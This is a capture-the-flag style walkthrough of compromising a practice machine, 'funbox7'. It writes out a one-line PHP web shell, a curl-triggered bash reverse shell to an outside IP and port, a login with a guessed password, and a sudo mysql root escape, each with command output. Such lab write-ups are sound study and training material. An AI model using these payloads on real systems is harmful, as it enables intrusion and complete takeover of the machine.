Here we discovered mini.php page on the root dir.

This page seems to allow us to upload arbitrary file, and we might be able to upload php file because there is uploaded php file. Let's try it.

Foothold

I simply uploaded simple webshell php file below:

<?php system($_REQUEST[cmd]);?>

Then, confirm it successfully uploaded with curl command.

└─$ curl -s -G http://192.168.173.132/simple_shell.php? --data-urlencode "cmd=id" 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Because the test was successful, we can get reverse shell.

└─$ curl -s -G http://192.168.173.132/simple_shell.php? --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.177/4444 0>&1'"

PrivEsc

Before enumerate whole directory on the target machine, we should test if we can change user with password which is the same with username.

First, we have to stabilize the reverse shell.

www-data@funbox7:/var/www/html$ script /dev/null -c /bin/bash
script /dev/null -c /bin/bash

www-data@funbox7:/var/www/html$ ^Z

Then, test it.

www-data@funbox7:/var/www/html$ su goat
Password: 
goat@funbox7:/var/www/html$ 
goat@funbox7:/var/www/html$ id
uid=1003(goat) gid=1003(goat) groups=1003(goat),111(ssh)

We could change user to goat user with password 'goat'.

goat@funbox7:/var/www/html$ sudo -l
Matching Defaults entries for goat on funbox7:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goat may run the following commands on funbox7:
    (root) NOPASSWD: /usr/bin/mysql

According to sudo -l commond, we can run mysql as root user.

Searching the keyword 'mysql' on GTFOBins page revealed that we can easily get root shell with displayed code.

goat@funbox7:/var/www/html$     sudo mysql -e '\! /bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)

We got root shell. You can find proof.text on /root and local.txt on /var/www.
